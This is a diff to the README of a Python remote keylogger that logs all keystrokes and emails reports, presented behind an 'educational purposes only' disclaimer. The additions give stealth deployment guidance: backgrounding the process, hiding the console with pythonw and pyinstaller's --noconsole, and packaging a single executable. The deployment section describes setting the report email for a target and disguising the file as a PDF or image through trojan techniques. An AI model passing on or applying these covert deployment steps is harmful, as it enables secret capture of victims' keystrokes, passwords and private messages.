@@ -16,10 +16,10 @@ Tanit Keylogger is part of a toolset of Ethical Hacking tools that I will publis
 
 
 # Code of Conduct
-**Launching this tool against unauthorised and unwilling users is immoral and illegal. As a white hat hacker or security specialist, your job after taking permission, is to discover vulnerabilities in programs, systems and networks (white hat hacking) or help in discovering any gullibility in users (by social engineering). Thus, you can only launch Tanit or any other tool I will publish later in this series when you are given permission by the company that hires you or you only launch it against your own servers or networks. This tool is written after taking several Ethical Hacking and Security courses. So, in other words, the code (which has a generated executable intentionally detectable by antiviruses) can be found in a form or another in ethical hacking books and courses. I have added enhancements on the tool of course. To reiterate: This is a tool written in the sole purpose of teaching you how remote and local keyloggers work and it really shows you how much it is easy to write a simple, effective and yet powerful keylogger in Python. This tool is for educational purposes only and it is not meant to be used in any harmful way. To reiterate, this tool is meant to be a tool to be studied by white hat hackers and security specialists and is not meant to be deployed against users that do not give you explicit permission.**
+**Launching this tool against unauthorised and unwilling users is both immoral and illegal. As a white hat hacker or security specialist, your job after taking permission, is to discover vulnerabilities in programs, systems and networks (white hat hacking) or help in discovering any gullibility in users (by social engineering). Thus, you can only launch Tanit or any other tool that I will publish later in this hacking series only and only when you are given explicit permission by the company that hires you or you are launching attacks against your own servers or networks. This tool is written after taking several ethical hacking and security courses. So, in other words, the code, which has a generated executable is intentionally detectable by antiviruses. It can be found in a form or another in many ethical hacking books and courses. I have added many enhancements to the tools. To reiterate: This is a tool written in the sole purpose of teaching you how remote and local keyloggers work and it really shows you how much it is easy to write a simple, effective and yet powerful keyloggers in Python. This tool is for educational purposes only and it is not meant to be used in any harmful way. To reiterate, this tool is meant to be a tool to be studied by white hat hackers and security specialists and is not meant to be deployed against users that do not give you explicit permission.**
 
 # Description
-A python Remote keylogger that logs all keystrokes that have been typed by a user and then sends a report to an email every specific amount of time. You can package it as an executable for MS Windows, Linux OSs, and Mac OS. Please refer to the section called Packaging where I explain how to do that in detail. Enjoy!
+A python remote keylogger that logs all keystrokes that have been typed by a user and then sends a report to an email every specific amount of time. You can package it as an executable for MS Windows, Linux OSs, and Mac OS. Please refer to the section called Packaging where I explain how to do that in detail. Enjoy!
 
 # Requirements
 You need to install pynput Python module. You can install it by pip or any other method you that you are confortable with:
@@ -29,20 +29,33 @@ pip install pynput
 
 # Usage 
 ## Irrealistic usage (educational)
+To run the tool in the foreground:
 
 ```
 python main.py 
 ```
+To run the tool in the background (on Linux or MacOS):
+```
+python main.py &
+```
+
+On MS Windows: you can run in background without showing a console by using pythonw.exe instead of python.exe. You can rename the extension of main.py to main.pyw if you want.
+```
+pythonw main.pyw
+```
+
+A better way to hide the the terminal/console is elucidated in the Packaging section which is a more realistic usage of any keylogger. The section details how to create an executable out of Tanit keylogger.
+
 ## Deployment Usage
-You need to package the source code as executable for your target Operating System (please see packaging). Please change the time interval and email to suit your needs in main.py. Black and grey hat hackers normally use trojan horse techniques to masquerade the tool as a legitimate application so that the user will not be suspicious and would click on the file to run the application which could look like a PDF or image or anything really.
+You need to package the source code as an executable for your target operating system (please see packaging). Please change the time interval and the email to suit your needs in main.py. Black and grey hat hackers normally use trojan horse techniques to masquerade the tool as a legitimate application so that the user will not be suspicious and would click on the file to run the application which could look like a PDF or an image or anything really.
 
 # Packaging
-You need the pyinstaller. You can install it via pip or pip3 or via apt package manager vel cetera
+You need the pyinstaller. You can install it via pip or pip3 or via apt package manager etc
 ```
 pip install pyinstaller
 ```
 
-A program called pyinstaller is installed in the Python directory. On Windows it would be an executable: pyinstaller.exe
+A program called pyinstaller is installed in the Python directory. On Windows, it would be an executable: pyinstaller.exe
 
 ## Notez Bien - Antivirus won't be happy!!!
 
@@ -53,7 +66,7 @@ pyinstaller main.py --onefile
 ```
 --onefile means  pyinstaller will package all the python files into a single executable
 
-## How to package and run the excutable silently (without showing a terminal to the user)
+## How to package and run the excutable silently i.e. without showing a terminal/console to the user
 If you do not want the user to see a command prompt after the .exe is run. You can add another argument called
 --noconsole
 
